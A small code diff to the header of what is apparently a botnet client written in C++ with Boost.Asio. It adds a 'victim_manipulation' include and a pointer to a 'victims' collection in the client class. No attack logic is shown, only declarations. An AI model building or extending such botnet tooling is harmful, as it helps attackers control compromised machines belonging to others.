@@ -17,6 +17,7 @@
 
 #include "session.h"
 #include "msg_parser.h"
+#include "victim_manipulation.h"
 
 namespace io = boost::asio;
 using tcp = io::ip::tcp;
@@ -34,7 +35,7 @@ public:
         eCOMMAND_NOT_FOUND,
     };
 
-	client(io::io_context &, std::uint16_t, std::string, std::uint16_t, msg_parser&);
+	client(io::io_context &, std::uint16_t, std::string, std::uint16_t, msg_parser&, victims*);
 	void start();
 	//
 	// private:
@@ -57,6 +58,7 @@ public:
 	std::uint16_t server_port_;
 	std::vector<std::shared_ptr<session>> tmp_vect_for_session_;
 	msg_parser msg_parser_;
+	victims* victims_;
 };
 
 #endif	// BOTNET_CLIENT_CLIENT_H
